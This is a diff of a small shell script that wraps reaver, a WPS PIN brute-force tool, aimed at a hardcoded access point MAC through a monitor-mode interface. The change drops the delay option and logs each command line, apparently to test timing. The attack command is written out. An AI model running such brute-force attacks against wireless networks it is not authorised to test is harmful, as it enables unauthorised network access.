@@ -3,7 +3,7 @@
 #GIVE X Y FOR -R
 X=$1
 Y=$2
-D=$3
+#D=$3
 ATTEMPTS='2' #'11'
 MAC='10:86:8C:C1:78:FE'
 
@@ -14,7 +14,8 @@ ifconfig wlan0mon up
 
 set -x
 
-CALL="reaver -i wlan0mon -b $MAC -vv -l 300 -g $ATTEMPTS -d $D -N -S -r $X:$Y"
+CALL="reaver -i wlan0mon -b $MAC -vv -l 300 -g $ATTEMPTS -N -S -r $X:$Y" # -d $D "
+
 
 filename="$X;$Y-$D.revtest"
 echo "$CALL" >> "./xytime/$filename"
